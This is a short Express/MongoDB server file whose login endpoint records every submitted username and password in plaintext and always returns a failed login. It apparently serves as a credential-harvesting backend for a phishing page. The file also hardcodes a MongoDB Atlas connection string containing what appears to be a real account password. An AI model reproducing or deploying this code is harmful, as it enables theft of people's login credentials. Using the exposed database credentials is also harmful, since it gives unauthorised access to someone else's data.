const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// Replace with your MongoDB Atlas connection string
const MONGO_URI = 'mongodb+srv://shashankaggarwal13:T0G3IeUHCuUmi3Pa@cluster0.di4x21x.mongodb.net/';

mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.error('MongoDB connection error:', err));

const UserSchema = new mongoose.Schema({
  username: String,
  password: String,
  createdAt: { type: Date, default: Date.now }
});
const User = mongoose.model('User', UserSchema);

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  try {
    await User.create({ username, password });
    // Always return login failed for demo
    return res.json({ success: false });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
